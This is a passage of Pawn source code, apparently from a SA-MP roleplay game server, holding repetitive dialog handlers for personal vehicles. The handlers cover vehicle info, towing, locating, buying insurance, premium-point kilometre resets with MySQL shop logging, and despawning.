				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[pcarid][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[pcarid][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[pcarid][playerid];
			    if(personalcar[pcarid][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[pcarid][playerid]] = 0;
					DestroyVehicle(personalcar[pcarid][playerid]);
					OwnedVeh(personalcar[pcarid][playerid]) = 0;
					Gas[personalcar[pcarid][playerid]] = 100;
					personalcar[pcarid][playerid] = 0;
					DespawnCar[playerid][pcarid] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN14)
	{
	    if(response)
	    {
			new pcarid = 13;
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey14],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[pcarid][playerid],car2 = PlayerInfo[playerid][pCarkey14];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[pcarid][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[pcarid][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[pcarid][playerid];
			    if(personalcar[pcarid][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[pcarid][playerid]] = 0;
					DestroyVehicle(personalcar[pcarid][playerid]);
					OwnedVeh(personalcar[pcarid][playerid]) = 0;
					Gas[personalcar[pcarid][playerid]] = 100;
					personalcar[pcarid][playerid] = 0;
					DespawnCar[playerid][pcarid] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN15)
	{
	    if(response)
	    {
			new pcarid = 14;
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pCarkey15],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[pcarid][playerid],car2 = PlayerInfo[playerid][pCarkey15];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
				if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
			    if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[pcarid][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[pcarid][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 1;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
				    ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[pcarid][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[pcarid][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[pcarid][playerid];
			    if(personalcar[pcarid][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[pcarid][playerid]] = 0;
					DestroyVehicle(personalcar[pcarid][playerid]);
					OwnedVeh(personalcar[pcarid][playerid]) = 0;
					Gas[personalcar[pcarid][playerid]] = 100;
					personalcar[pcarid][playerid] = 0;
					DespawnCar[playerid][pcarid] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN2)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pmotokey],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[1][playerid],car2 = PlayerInfo[playerid][pmotokey];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
			    if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[1][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[1][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 2;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
    				ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[1][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[1][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[1][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[1][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[1][playerid];
			    if(personalcar[1][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[1][playerid]] = 0;
					DestroyVehicle(personalcar[1][playerid]);
					OwnedVeh(personalcar[1][playerid]) = 0;
					Gas[personalcar[1][playerid]] = 100;
					personalcar[1][playerid] = 0;
					DespawnCar[playerid][1] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN3)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pprcarkey],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[2][playerid],car2 = PlayerInfo[playerid][pprcarkey];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
			    if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[2][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[2][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 3;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
    				ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[2][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[2][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[2][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[2][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[2][playerid];
			    if(personalcar[2][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[2][playerid]] = 0;
					DestroyVehicle(personalcar[2][playerid]);
					OwnedVeh(personalcar[2][playerid]) = 0;
					Gas[personalcar[2][playerid]] = 100;
					personalcar[2][playerid] = 0;
					DespawnCar[playerid][2] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN4)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pprcarkey2],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[3][playerid],car2 = PlayerInfo[playerid][pprcarkey2];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
			    if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[3][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[3][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 4;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
    				ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[3][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[3][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[3][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[3][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[3][playerid];
			    if(personalcar[3][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[3][playerid]] = 0;
					DestroyVehicle(personalcar[3][playerid]);
					OwnedVeh(personalcar[3][playerid]) = 0;
					Gas[personalcar[3][playerid]] = 100;
					personalcar[3][playerid] = 0;
					DespawnCar[playerid][3] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN5)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pPPluscarkey],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
				new car = personalcar[4][playerid],car2 = PlayerInfo[playerid][pPPluscarkey];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
			    if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[4][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[4][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 5;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
    				ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[4][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[4][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[4][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[4][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[4][playerid];
			    if(personalcar[4][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[4][playerid]] = 0;
					DestroyVehicle(personalcar[4][playerid]);
					OwnedVeh(personalcar[4][playerid]) = 0;
					Gas[personalcar[4][playerid]] = 100;
					personalcar[4][playerid] = 0;
					DespawnCar[playerid][4] = -1;
			    }
                else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_VEHSPAWN6)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new carid = PlayerInfo[playerid][pPPluscarkey2],stringgg[256],speed;
			    speed = MySQLCheckSpeed(CarInfo[carid][cModel]);
			    format(stringgg,sizeof(stringgg),"Vehicle Model: %d\nDistance Traveled: %.0f KM\nVehicle Age: %d days\nInsurance Price: $%s\nInsurance Points: %d\nTop speed with engine upgrades: %d km/h",CarInfo[carid][cModel],CarInfo[carid][cKM],CarInfo[carid][cDays],FormatNumber(CarInfo[carid][cInscarprice]),CarInfo[carid][cInsurancecar],speed);
				ShowPlayerDialog(playerid,DIALOG_VEHINFO,DIALOG_STYLE_MSGBOX,"Vehicle Info",stringgg,"Close","");
				return 1;
			}
			if(listitem == 1)
			{
